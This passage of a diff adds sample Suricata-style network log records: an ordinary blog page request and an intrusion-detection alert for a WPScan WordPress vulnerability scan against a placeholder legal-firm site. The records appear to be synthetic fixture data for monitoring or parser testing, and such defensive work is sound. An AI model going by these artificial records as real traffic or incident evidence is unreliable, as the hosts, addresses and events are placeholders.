+        "flow_id": 1829127292340191,
+        "pcap_cnt": 140191,
+        "event_type": "http",
+        "src_ip": "192.168.1.220",
+        "src_port": 55168,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/post4",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 9876
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 7,
+            "bytes_toserver": 856,
+            "bytes_toclient": 10234,
+            "start": "2025-02-23T10:16:48.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:50.130726+0300",
+        "flow_id": 1829127292340192,
+        "pcap_cnt": 140192,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55222,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-content/themes/twentytwenty/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:49.870356+0300"
+        }
+    }
+]
